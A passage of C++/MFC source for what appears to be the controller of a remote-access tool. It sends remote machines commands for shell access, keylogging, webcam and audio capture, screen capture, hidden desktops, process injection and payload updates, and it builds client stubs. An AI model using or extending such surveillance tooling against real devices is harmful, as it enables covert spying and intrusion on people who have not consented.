            Temp/=g_Column_Online_Width;                    //看一看当前宽度占总长度的几分之几
            Temp*=total;                                    //用原来的长度乘以所占的几分之几得到当前的宽度
            int lenth = Temp;                               //转换为int 类型
            m_CList_Online.SetColumnWidth(i,(lenth));       //设置当前的宽度
        }
    }
    LeaveCriticalSection(&m_cs);

    if (m_CList_Message.m_hWnd!=NULL) {
        CRect rc;
        rc.left = 1;         //列表的左坐标
        rc.top = cy-160;     //列表的上坐标
        rc.right  = cx-1;    //列表的右坐标
        rc.bottom = cy-20;   //列表的下坐标
        m_CList_Message.MoveWindow(rc);
        auto total = cx - 24;
        for(int i=0; i<g_Column_Count_Message; ++i) {        //遍历每一个列
            double Temp=g_Column_Data_Message[i].nWidth;     //得到当前列的宽度
            Temp/=g_Column_Message_Width;                    //看一看当前宽度占总长度的几分之几
            Temp*=total;                                     //用原来的长度乘以所占的几分之几得到当前的宽度
            int lenth=Temp;                                  //转换为int 类型
            m_CList_Message.SetColumnWidth(i,(lenth));        //设置当前的宽度
        }
    }

    if(m_StatusBar.m_hWnd!=NULL) {   //当对话框大小改变时 状态条大小也随之改变
        CRect Rect;
        Rect.top=cy-20;
        Rect.left=0;
        Rect.right=cx;
        Rect.bottom=cy;
        m_StatusBar.MoveWindow(Rect);
        m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0),SBPS_POPOUT, cx-10);
    }

    if(m_ToolBar.m_hWnd!=NULL) {                //工具条
        CRect rc;
        rc.top=rc.left=0;
        rc.right=cx;
        rc.bottom=80;
        m_ToolBar.MoveWindow(rc);             //设置工具条大小位置
    }
}

LRESULT CMy2015RemoteDlg::OnPasswordCheck(WPARAM wParam, LPARAM lParam)
{
    static bool isChecking = false;
    if (isChecking)
        return S_OK;

    isChecking = true;
    if (!CheckValid(-1)) {
        KillTimer(TIMER_CHECK);
        m_nMaxConnection = 2;
        THIS_APP->UpdateMaxConnection(m_nMaxConnection);
        int tm = THIS_CFG.GetInt("settings", "Notify", 10);
        THIS_CFG.SetInt("settings", "Notify", tm - 1);
    }
    isChecking = false;
    return S_OK;
}

void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
{
    if (nIDEvent == TIMER_CHECK) {
        static int count = 0;
        static std::string eventName = EventName();
        HANDLE hEvent = OpenEventA(SYNCHRONIZE, FALSE, eventName.c_str());
        if (hEvent) {
            SAFE_CLOSE_HANDLE(hEvent);
        } else if (++count == 10) {
            THIS_APP->UpdateMaxConnection(count);
        }
        if (!m_superPass.empty()) {
            Mprintf(">>> Timer is killed <<<\n");
            KillTimer(nIDEvent);
            std::string masterHash = GetMasterHash();
            if (GetPwdHash() != masterHash)
                THIS_CFG.SetStr("settings", "superAdmin", m_superPass);
            if (GetPwdHash() == masterHash)
                THIS_CFG.SetStr("settings", "HMAC", genHMAC(masterHash, m_superPass));
            return;
        }
        PostMessageA(WM_PASSWORDCHECK);
    }
    if (nIDEvent == TIMER_CLOSEWND) {
        DeletePopupWindow();
    }
    if (nIDEvent == TIMER_CLEAR_BALLOON)
    {
        KillTimer(TIMER_CLEAR_BALLOON);

        // 清除气球通知
        NOTIFYICONDATA nid = m_Nid;
        nid.cbSize = sizeof(NOTIFYICONDATA);
        nid.uFlags = NIF_INFO;
        nid.szInfo[0] = '\0';
        nid.szInfoTitle[0] = '\0';
        Shell_NotifyIcon(NIM_MODIFY, &nid);
    }

    CDialogEx::OnTimer(nIDEvent);
}


void CMy2015RemoteDlg::DeletePopupWindow()
{
    if (m_pFloatingTip) {
        if (::IsWindow(m_pFloatingTip->GetSafeHwnd()))
            m_pFloatingTip->DestroyWindow();
        SAFE_DELETE(m_pFloatingTip);
    }
    KillTimer(TIMER_CLOSEWND);
}


void CMy2015RemoteDlg::OnClose()
{
    // 隐藏窗口而不是关闭
    ShowWindow(SW_HIDE);
    Mprintf("======> Hide\n");
}

void CMy2015RemoteDlg::Release()
{
    Mprintf("======> Release\n");
    UninitFileUpload();
    DeletePopupWindow();
    isClosed = TRUE;
    m_frpStatus = STATUS_EXIT;
    ShowWindow(SW_HIDE);

    Shell_NotifyIcon(NIM_DELETE, &m_Nid);

    BYTE bToken = CLIENT_EXIT_WITH_SERVER ? COMMAND_BYE : SERVER_EXIT;
    EnterCriticalSection(&m_cs);
    for (auto i=m_HostList.begin(); i!=m_HostList.end(); ++i) {
        context* ContextObject = *i;
        ContextObject->Send2Client(&bToken, sizeof(BYTE));
        ContextObject->Destroy();
    }
    LeaveCriticalSection(&m_cs);
    Sleep(500);
    while (m_hFRPThread)
        Sleep(20);

    THIS_APP->Destroy();
    SAFE_DELETE(m_gridDlg);
    g_2015RemoteDlg = NULL;
    SetEvent(m_hExit);
    SAFE_CLOSE_HANDLE(m_hExit);
    m_hExit = NULL;
    Sleep(500);

    timeEndPeriod(1);
}

int CALLBACK CMy2015RemoteDlg::CompareFunction(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort)
{
    auto* pSortInfo = reinterpret_cast<std::pair<int, bool>*>(lParamSort);
    int nColumn = pSortInfo->first;
    bool bAscending = pSortInfo->second;

    // 获取列值
    CONTEXT_OBJECT* context1 = (CONTEXT_OBJECT*)lParam1;
    CONTEXT_OBJECT* context2 = (CONTEXT_OBJECT*)lParam2;
    CString s1 = context1->GetClientData(nColumn);
    CString s2 = context2->GetClientData(nColumn);

    int result = s1 > s2 ? 1 : -1;
    return bAscending ? result : -result;
}

void CMy2015RemoteDlg::SortByColumn(int nColumn)
{
    static int m_nSortColumn = 0;
    static bool m_bSortAscending = false;
    if (nColumn == m_nSortColumn) {
        // 如果点击的是同一列，切换排序顺序
        m_bSortAscending = !m_bSortAscending;
    } else {
        // 否则，切换到新列并设置为升序
        m_nSortColumn = nColumn;
        m_bSortAscending = true;
    }

    // 创建排序信息
    std::pair<int, bool> sortInfo(m_nSortColumn, m_bSortAscending);
    EnterCriticalSection(&m_cs);
    m_CList_Online.SortItems(CompareFunction, reinterpret_cast<LPARAM>(&sortInfo));
    LeaveCriticalSection(&m_cs);
}

void CMy2015RemoteDlg::OnHdnItemclickList(NMHDR* pNMHDR, LRESULT* pResult)
{
    LPNMHEADER pNMHeader = reinterpret_cast<LPNMHEADER>(pNMHDR);
    int nColumn = pNMHeader->iItem; // 获取点击的列索引
    SortByColumn(nColumn);          // 调用排序函数
    *pResult = 0;
}


void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
    LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

    //弹出菜单

    CMenu	Menu;
    Menu.LoadMenu(IDR_MENU_LIST_ONLINE);               //加载菜单资源   资源和类对象关联

    CMenu* SubMenu = Menu.GetSubMenu(0);

    CPoint	Point;
    GetCursorPos(&Point);

    Menu.SetMenuItemBitmaps(ID_ONLINE_MESSAGE, MF_BYCOMMAND, &m_bmOnline[0], &m_bmOnline[0]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_UPDATE, MF_BYCOMMAND, &m_bmOnline[1], &m_bmOnline[1]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_DELETE, MF_BYCOMMAND, &m_bmOnline[2], &m_bmOnline[2]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_SHARE, MF_BYCOMMAND, &m_bmOnline[3], &m_bmOnline[3]);
    Menu.SetMenuItemBitmaps(ID_MAIN_PROXY, MF_BYCOMMAND, &m_bmOnline[4], &m_bmOnline[4]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_HOSTNOTE, MF_BYCOMMAND, &m_bmOnline[5], &m_bmOnline[5]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_VIRTUAL_DESKTOP, MF_BYCOMMAND, &m_bmOnline[6], &m_bmOnline[6]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_GRAY_DESKTOP, MF_BYCOMMAND, &m_bmOnline[7], &m_bmOnline[7]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_REMOTE_DESKTOP, MF_BYCOMMAND, &m_bmOnline[8], &m_bmOnline[8]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_H264_DESKTOP, MF_BYCOMMAND, &m_bmOnline[9], &m_bmOnline[9]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_AUTHORIZE, MF_BYCOMMAND, &m_bmOnline[10], &m_bmOnline[10]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_UNAUTHORIZE, MF_BYCOMMAND, &m_bmOnline[11], &m_bmOnline[11]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_ASSIGN_TO, MF_BYCOMMAND, &m_bmOnline[12], &m_bmOnline[12]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_ADD_WATCH, MF_BYCOMMAND, &m_bmOnline[13], &m_bmOnline[13]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_RUN_AS_ADMIN, MF_BYCOMMAND, &m_bmOnline[14], &m_bmOnline[14]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_UNINSTALL, MF_BYCOMMAND, &m_bmOnline[15], &m_bmOnline[15]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_PRIVATE_SCREEN, MF_BYCOMMAND, &m_bmOnline[16], &m_bmOnline[16]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_REGROUP, MF_BYCOMMAND, &m_bmOnline[17], &m_bmOnline[17]);
    Menu.SetMenuItemBitmaps(ID_ONLINE_INJ_NOTEPAD, MF_BYCOMMAND, &m_bmOnline[18], &m_bmOnline[18]);
    Menu.SetMenuItemBitmaps(ID_PROXY_PORT, MF_BYCOMMAND, &m_bmOnline[19], &m_bmOnline[19]);

    std::string masterHash(GetMasterHash());
    if (GetPwdHash() != masterHash) {
        Menu.DeleteMenu(ID_ONLINE_AUTHORIZE, MF_BYCOMMAND);
        Menu.DeleteMenu(ID_ONLINE_UNAUTHORIZE, MF_BYCOMMAND);
    }

    // 创建一个新的子菜单
    CMenu newMenu;
    if (!newMenu.CreatePopupMenu()) {
        MessageBox(_T("创建分享主机的子菜单失败!"), "提示");
        return;
    }

    int i = 0;
    for (const auto& s : m_DllList) {
        // 向子菜单中添加菜单项
        newMenu.AppendMenuA(MF_STRING, ID_DYNAMIC_MENU_BASE + i++, s->Name.c_str());
    }
    if (i == 0) {
        newMenu.AppendMenuA(MF_STRING, ID_DYNAMIC_MENU_BASE, "操作指导");
    }
    // 将子菜单添加到主菜单中
    SubMenu->AppendMenuA(MF_STRING | MF_POPUP, (UINT_PTR)newMenu.Detach(), _T("执行代码"));

    int	iCount = SubMenu->GetMenuItemCount();
    EnterCriticalSection(&m_cs);
    int n = m_CList_Online.GetSelectedCount();
    LeaveCriticalSection(&m_cs);
    if (n == 0) {       //如果没有选中
        for (int i = 0; i < iCount; ++i) {
            SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
        }
    } else if (GetPwdHash() != GetMasterHash()) {
        SubMenu->EnableMenuItem(ID_ONLINE_AUTHORIZE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
        SubMenu->EnableMenuItem(ID_ONLINE_UNAUTHORIZE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
    }

    // 刷新菜单显示
    DrawMenuBar();
    SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);

    *pResult = 0;
}


void CMy2015RemoteDlg::OnOnlineMessage()
{
    BYTE bToken = COMMAND_TALK;   //向被控端发送一个COMMAND_SYSTEM
    SendSelectedCommand(&bToken, sizeof(BYTE));
}

void CMy2015RemoteDlg::OnOnlineUpdate()
{
    if (IDYES != MessageBox(_T("确定升级选定的被控程序吗?\n需受控程序支持方可生效!"),
                            _T("提示"), MB_ICONQUESTION | MB_YESNO))
        return;

    Buffer* buf = m_ServerDLL[PAYLOAD_DLL_X64];
    ULONGLONG fileSize = buf->length(true) - 6;
    PBYTE buffer = new BYTE[fileSize + 9];
    if (buffer) {
        buffer[0] = COMMAND_UPDATE;
        memcpy(buffer + 1, &fileSize, 8);
        memcpy(buffer + 9, buf->c_str() + 6, fileSize);
        SendSelectedCommand((PBYTE)buffer, 9 + fileSize);
        delete[] buffer;
    }
}

std::string floatToString(float f)
{
    char buf[32];
    snprintf(buf, sizeof(buf), "%.2f", f);
    return std::string(buf);
}

void CMy2015RemoteDlg::OnOnlineDelete()
{
    // TODO: 在此添加命令处理程序代码
    if (IDYES != MessageBox(_T("确定删除选定的被控计算机吗?"), _T("提示"), MB_ICONQUESTION | MB_YESNO))
        return;

    BYTE bToken = COMMAND_BYE;   //向被控端发送一个COMMAND_SYSTEM
    SendSelectedCommand(&bToken, sizeof(BYTE));   //Context     PreSending   PostSending

    EnterCriticalSection(&m_cs);
    int iCount = m_CList_Online.GetSelectedCount();
    for (int i=0; i<iCount; ++i) {
        POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
        int iItem = m_CList_Online.GetNextSelectedItem(Pos);
        CString strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);
        context* ctx = (context*)m_CList_Online.GetItemData(iItem);
        m_CList_Online.DeleteItem(iItem);
        m_HostList.erase(ctx);
        auto tm = ctx->GetAliveTime();
        std::string aliveInfo = tm >= 86400 ? floatToString(tm / 86400.f) + " d" :
                                tm >= 3600 ? floatToString(tm / 3600.f) + " h" :
                                tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
        ctx->Destroy();
        strIP+="断开连接";
        ShowMessage("操作成功",strIP + "[" + aliveInfo.c_str() + "]");
    }
    LeaveCriticalSection(&m_cs);
}

VOID CMy2015RemoteDlg::OnOnlineCmdManager()
{
    BYTE	bToken = COMMAND_SHELL;
    SendSelectedCommand(&bToken, sizeof(BYTE));
}


VOID CMy2015RemoteDlg::OnOnlineProcessManager()
{
    BYTE	bToken = COMMAND_SYSTEM;
    SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineWindowManager()
{
    BYTE	bToken = COMMAND_WSLIST;
    SendSelectedCommand(&bToken, sizeof(BYTE));
}


VOID CMy2015RemoteDlg::OnOnlineDesktopManager()
{
    int n = THIS_CFG.GetInt("settings", "DXGI");
    BOOL all = THIS_CFG.GetInt("settings", "MultiScreen");
    CString algo = THIS_CFG.GetStr("settings", "ScreenCompress", "").c_str();
    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, n, algo.IsEmpty() ? ALGORITHM_DIFF : atoi(algo.GetString()), all};
    SendSelectedCommand(bToken, sizeof(bToken));
}

VOID CMy2015RemoteDlg::OnOnlineFileManager()
{
    BYTE	bToken = COMMAND_LIST_DRIVE;
    SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineAudioManager()
{
    BYTE	bToken = COMMAND_AUDIO;
    SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineVideoManager()
{
    BYTE	bToken = COMMAND_WEBCAM;
    SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineServerManager()
{
    BYTE	bToken = COMMAND_SERVICES;
    SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineRegisterManager()
{
    BYTE	bToken = COMMAND_REGEDIT;
    SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineKeyboardManager()
{
    BYTE	bToken = COMMAND_KEYBOARD;
    SendSelectedCommand(&bToken, sizeof(BYTE));
}

std::vector<std::string> splitString(const std::string& str, char delimiter)
{
    std::vector<std::string> result;
    std::stringstream ss(str);
    std::string item;

    while (std::getline(ss, item, delimiter)) {
        result.push_back(item);
    }
    return result;
}

std::string joinString(const std::vector<std::string>& tokens, char delimiter)
{
    std::ostringstream oss;

    for (size_t i = 0; i < tokens.size(); ++i) {
        oss << tokens[i];
        if (i != tokens.size() - 1) {  // 在最后一个元素后不添加分隔符
            oss << delimiter;
        }
    }

    return oss.str();
}


bool CMy2015RemoteDlg::CheckValid(int trail)
{
    static DateVerify verify;
    BOOL isTrail = trail < 0 ? FALSE : verify.isTrail(trail);

    if (!isTrail) {
        const Validation *verify = GetValidation();
        std::string masterHash = GetMasterHash();
        if (masterHash != GetPwdHash() && !verify->IsValid()) {
            return false;
        }

        auto settings = "settings", pwdKey = "Password";
        // 验证口令
        CPasswordDlg dlg(this);
        static std::string hardwareID = GetHardwareID();
        static std::string hashedID = hashSHA256(hardwareID);
        static std::string deviceID = getFixedLengthID(hashedID);
        CString pwd = THIS_CFG.GetStr(settings, pwdKey, "").c_str();

        dlg.m_sDeviceID = deviceID.c_str();
        dlg.m_sPassword = pwd;
        if (pwd.IsEmpty() && IDOK != dlg.DoModal() || dlg.m_sPassword.IsEmpty()) {
            return false;
        }

        // 密码形式：20250209 - 20350209: SHA256: HostNum
        auto v = splitString(dlg.m_sPassword.GetBuffer(), '-');
        if (v.size() != 6 && v.size() != 7) {
            THIS_CFG.SetStr(settings, pwdKey, "");
            THIS_APP->MessageBox("格式错误，请重新申请口令!", "提示", MB_ICONINFORMATION);
            return false;
        }
        std::vector<std::string> subvector(v.end() - 4, v.end());
        std::string password = v[0] + " - " + v[1] + ": " + GetPwdHash() + (v.size()==6?"":": "+v[2]);
        std::string finalKey = deriveKey(password, deviceID);
        std::string hash256 = joinString(subvector, '-');
        std::string fixedKey = getFixedLengthID(finalKey);
        if (hash256 != fixedKey) {
            THIS_CFG.SetStr(settings, pwdKey, "");
            THIS_CFG.SetStr(settings, "PwdHmac", "");
            if (pwd.IsEmpty() || hash256 != fixedKey || IDOK != dlg.DoModal()) {
                if (!dlg.m_sPassword.IsEmpty())
                    THIS_APP->MessageBox("口令错误, 无法继续操作!", "提示", MB_ICONWARNING);
                return false;
            }
        }
        // 判断是否过期
        auto pekingTime = ToPekingTime(nullptr);
        char curDate[9];
        std::strftime(curDate, sizeof(curDate), "%Y%m%d", &pekingTime);
        if (curDate < v[0] || curDate > v[1]) {
            THIS_CFG.SetStr(settings, pwdKey, "");
            THIS_APP->MessageBox("口令过期，请重新申请口令!", "提示", MB_ICONINFORMATION);
            return false;
        }
        if (dlg.m_sPassword != pwd)
            THIS_CFG.SetStr(settings, pwdKey, dlg.m_sPassword.GetString());

        int maxConn = v.size() == 7 ? atoi(v[2].c_str()) : 2;
        if (maxConn != m_nMaxConnection) {
            m_nMaxConnection = maxConn;
            THIS_APP->UpdateMaxConnection(m_nMaxConnection);
        }
    }
    return true;
}

void CMy2015RemoteDlg::OnOnlineBuildClient()
{
    // TODO: 在此添加命令处理程序代码
    CBuildDlg Dlg;
    Dlg.m_strIP = THIS_CFG.GetStr("settings", "master", "").c_str();
    int Port = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
    Dlg.m_strIP = Dlg.m_strIP.IsEmpty() ? "127.0.0.1" : Dlg.m_strIP;
    Dlg.m_strPort = Port <= 0 ? "6543" : std::to_string(Port).c_str();
    Dlg.DoModal();
}


VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
{
    EnterCriticalSection(&m_cs);
    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
    while(Pos) {
        int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
        context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
        if (!ContextObject->IsLogin() && szBuffer[0] != COMMAND_BYE)
            continue;
        if (szBuffer[0] == COMMAND_UPDATE) {
            CString data = ContextObject->GetClientData(ONLINELIST_CLIENTTYPE);
            if (data == "SC" || data == "MDLL") {
                ContextObject->Send2Client(szBuffer, 1);
                continue;
            }
        }
        ContextObject->Send2Client(szBuffer, ulLength);
    }
    LeaveCriticalSection(&m_cs);
}

VOID CMy2015RemoteDlg::SendAllCommand(PBYTE  szBuffer, ULONG ulLength)
{
    EnterCriticalSection(&m_cs);
    for (int i=0; i<m_CList_Online.GetItemCount(); ++i) {
        context* ContextObject = (context*)m_CList_Online.GetItemData(i);
        if (!ContextObject->IsLogin() && szBuffer[0] != COMMAND_BYE)
            continue;
        if (szBuffer[0] == COMMAND_UPDATE) {
            CString data = ContextObject->GetClientData(ONLINELIST_CLIENTTYPE);
            if (data == "SC" || data == "MDLL") {
                ContextObject->Send2Client(szBuffer, 1);
                continue;
            }
        }
        ContextObject->Send2Client(szBuffer, ulLength);
    }
    LeaveCriticalSection(&m_cs);
}

//真彩Bar
VOID CMy2015RemoteDlg::OnAbout()
{
    MessageBox("Copyleft (c) FTU 2019—2026" + CString("\n编译日期: ") + __DATE__ +
               CString(sizeof(void*)==8 ? " (x64)" : " (x86)"), "关于");
}

//托盘Menu
void CMy2015RemoteDlg::OnNotifyShow()
{
    BOOL v=	IsWindowVisible();
    ShowWindow(v? SW_HIDE : SW_SHOW);
}


void CMy2015RemoteDlg::OnNotifyExit()
{
    Release();
    CDialogEx::OnOK(); // 关闭对话框
}


//固态菜单
void CMy2015RemoteDlg::OnMainSet()
{
    CSettingDlg  Dlg;
    Dlg.m_nMax_Connect = m_nMaxConnection;
    BOOL use = THIS_CFG.GetInt("frp", "UseFrp");
    int port = THIS_CFG.GetInt("frp", "server_port", 7000);
    auto token = THIS_CFG.GetStr("frp", "token");
    auto ret = Dlg.DoModal();   //模态 阻塞
    if (ret != IDOK) return;

    BOOL use_new = THIS_CFG.GetInt("frp", "UseFrp");
    int port_new = THIS_CFG.GetInt("frp", "server_port", 7000);
    auto token_new = THIS_CFG.GetStr("frp", "token");
    ApplyFrpSettings();
    if (use_new != use) {
        MessageBoxA("修改FRP代理开关，需要重启当前应用程序方可生效。", "提示", MB_ICONINFORMATION);
    } else if (port != port_new || token != token_new) {
        m_frpStatus = STATUS_STOP;
        Sleep(200);
        m_frpStatus = STATUS_RUN;
    }
    if (use && use_new && m_hFRPThread == NULL) {
#ifdef _WIN64
        MessageBoxA("FRP代理服务异常，需要重启当前应用程序进行重试。", "提示", MB_ICONINFORMATION);
#endif
    }
    int m = atoi(THIS_CFG.GetStr("settings", "ReportInterval", "5").c_str());
    int n = THIS_CFG.GetInt("settings", "SoftwareDetect");
    if (m== m_settings.ReportInterval && n == m_settings.DetectSoftware) {
        return;
    }

    LVCOLUMN lvColumn;
    memset(&lvColumn, 0, sizeof(LVCOLUMN));
    lvColumn.mask = LVCF_TEXT;
    lvColumn.pszText = Dlg.m_sSoftwareDetect.GetBuffer();
    CLock L(m_cs);
    m_settings.ReportInterval = m;
    m_settings.DetectSoftware = n;
    m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
    SendMasterSettings(nullptr);
}


void CMy2015RemoteDlg::OnMainExit()
{
    Release();
    CDialogEx::OnOK(); // 关闭对话框
}

std::string exec(const std::string& cmd)
{
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return "";
    }

    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;

    std::string command = "cmd.exe /C " + cmd;

    if (!CreateProcessA(
            NULL,
            (char*)command.data(),
            NULL,
            NULL,
            TRUE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        )) {
        SAFE_CLOSE_HANDLE(hReadPipe);
        SAFE_CLOSE_HANDLE(hWritePipe);
        return "";
    }

    SAFE_CLOSE_HANDLE(hWritePipe);

    char buffer[256];
    std::string result;
    DWORD bytesRead;

    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    SAFE_CLOSE_HANDLE(hReadPipe);
    WaitForSingleObject(pi.hProcess, INFINITE);
    SAFE_CLOSE_HANDLE(pi.hProcess);
    SAFE_CLOSE_HANDLE(pi.hThread);

    return result;
}

std::vector<std::string> splitByNewline(const std::string& input)
{
    std::vector<std::string> lines;
    std::istringstream stream(input);
    std::string line;

    while (std::getline(stream, line)) {
        lines.push_back(line);
    }

    return lines;
}

BOOL CMy2015RemoteDlg::Activate(const std::string& nPort,int nMaxConnection, const std::string& method)
{
    AUTO_TICK(200, "");
    UINT ret = 0;
    if ( (ret = THIS_APP->StartServer(NotifyProc, OfflineProc, nPort, nMaxConnection, method)) !=0 ) {
        Mprintf("======> StartServer Failed \n");
        char cmd[200];
        sprintf_s(cmd, "for /f \"tokens=5\" %%i in ('netstat -ano ^| findstr \":%s \"') do @echo %%i", nPort.c_str());
        std::string output = exec(cmd);
        output.erase(std::remove(output.begin(), output.end(), '\r'), output.end());
        if (!output.empty()) {
            std::vector<std::string> lines = splitByNewline(output);
            std::sort(lines.begin(), lines.end());
            auto last = std::unique(lines.begin(), lines.end());
            lines.erase(last, lines.end());

            std::string pids;
            for (const auto& line : lines) {
                pids += line + ",";
            }
            if (!pids.empty()) {
                pids.back() = '?';
            }
            if (IDYES == THIS_APP->MessageBox("调用函数StartServer失败! 错误代码:" + CString(std::to_string(ret).c_str()) +
                                              "\r\n是否关闭以下进程重试: " + pids.c_str(), "提示", MB_YESNO)) {
                for (const auto& line : lines) {
                    auto cmd = std::string("taskkill /f /pid ") + line;
                    exec(cmd.c_str());
                }
                return Activate(nPort, nMaxConnection, method);
            }
        } else
            THIS_APP->MessageBox("调用函数StartServer失败! 错误代码:" + CString(std::to_string(ret).c_str()));
        return FALSE;
    }

    ShowMessage("使用提示", "严禁用于非法侵入、控制、监听他人设备等违法行为");
    CString strTemp;
    strTemp.Format("监听端口: %s成功", nPort.c_str());
    ShowMessage("操作成功",strTemp);
    return TRUE;
}


BOOL CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
{
    if (!g_2015RemoteDlg || g_2015RemoteDlg->isClosed) {
        return FALSE;
    }
    int cmd = ContextObject->GetBYTE(0);
    AUTO_TICK(50, std::to_string(cmd));

    DialogBase* Dlg = (DialogBase*)ContextObject->hDlg;
    if (Dlg) {
        if (!IsWindow(Dlg->GetSafeHwnd()) || Dlg->IsClosed())
            return FALSE;
        Dlg->MarkReceiving(true);
        Dlg->OnReceiveComplete();
        Dlg->MarkReceiving(false);
    } else {
        HANDLE hEvent = USING_EVENT ? CreateEvent(NULL, TRUE, FALSE, NULL) : NULL;
        if (USING_EVENT && !hEvent) {
            Mprintf("===> NotifyProc CreateEvent FAILED: %p <===\n", ContextObject);
            return FALSE;
        }
        if (!g_2015RemoteDlg->PostMessage(WM_HANDLEMESSAGE, (WPARAM)hEvent, (LPARAM)ContextObject)) {
            Mprintf("===> NotifyProc PostMessage FAILED: %p <===\n", ContextObject);
            if (hEvent) SAFE_CLOSE_HANDLE(hEvent);
            return FALSE;
        }
        if (hEvent) {
            HANDLE handles[2] = { hEvent, g_2015RemoteDlg->m_hExit };
            DWORD result = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
            if (result == WAIT_FAILED) {
                DWORD err = GetLastError();
                Mprintf("NotifyProc WaitForMultipleObjects failed, error=%lu\n", err);
            }
        }
    }
    return TRUE;
}


BOOL CALLBACK CMy2015RemoteDlg::OfflineProc(CONTEXT_OBJECT* ContextObject)
{
    if (!g_2015RemoteDlg || g_2015RemoteDlg->isClosed)
        return FALSE;

    SOCKET nSocket = ContextObject->sClientSocket;

    g_2015RemoteDlg->PostMessage(WM_USEROFFLINEMSG, (WPARAM)ContextObject->hDlg, (LPARAM)nSocket);

    ContextObject->hDlg = NULL;

    return TRUE;
}


LRESULT CMy2015RemoteDlg::OnHandleMessage(WPARAM wParam, LPARAM lParam)
{
    HANDLE hEvent = (HANDLE)wParam;
    CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
    MessageHandle(ContextObject);
    if (hEvent) {
        SetEvent(hEvent);
        SAFE_CLOSE_HANDLE(hEvent);
    }
    return S_OK;
}

std::string getDateStr(int daysOffset = 0)
{
    // 获取当前时间点
    std::time_t now = std::time(nullptr);

    // 加上指定的天数（可以为负）
    now += static_cast<std::time_t>(daysOffset * 24 * 60 * 60);

    std::tm* t = std::localtime(&now);

    std::ostringstream oss;
    oss << std::setfill('0') << std::setw(4) << (t->tm_year + 1900)
        << std::setw(2) << (t->tm_mon + 1)
        << std::setw(2) << t->tm_mday;

    return oss.str();
}

bool SendData(void* user, FileChunkPacket* chunk, BYTE* data, int size)
{
    CONTEXT_OBJECT* ctx = (CONTEXT_OBJECT*)user;
    if (!ctx->Send2Client(data, size)) {
        return false;
    }
    return true;
}

void RecvData(void* ptr)
{
    FileChunkPacket* pkt = (FileChunkPacket*)ptr;
}

void delay_cancel(CONTEXT_OBJECT* ctx, int sec)
{
    if (!ctx) return;
    Sleep(sec*1000);
    ctx->CancelIO();
}

void FinishSend(void* user)
{
    CONTEXT_OBJECT* ctx = (CONTEXT_OBJECT*)user;
    // 需要等待客户端接收完成方可关闭
    std::thread(delay_cancel, ctx, 15).detach();
}

BOOL CMy2015RemoteDlg::AuthorizeClient(const std::string& sn, const std::string& passcode, uint64_t hmac)
{
    if (sn.empty() || passcode.empty() || hmac == 0) {
        return FALSE;
	}
    static const char* superAdmin = getenv("YAMA_PWD");
    std::string pwd = superAdmin ? superAdmin : m_superPass;
    return VerifyMessage(pwd, (BYTE*)passcode.c_str(), passcode.length(), hmac);
}

// 从char数组解析出多个路径
std::vector<std::string> ParseMultiStringPath(const char* buffer, size_t size)
{
	std::vector<std::string> paths;

	const char* p = buffer;
	const char* end = buffer + size;

	while (p < end)
	{
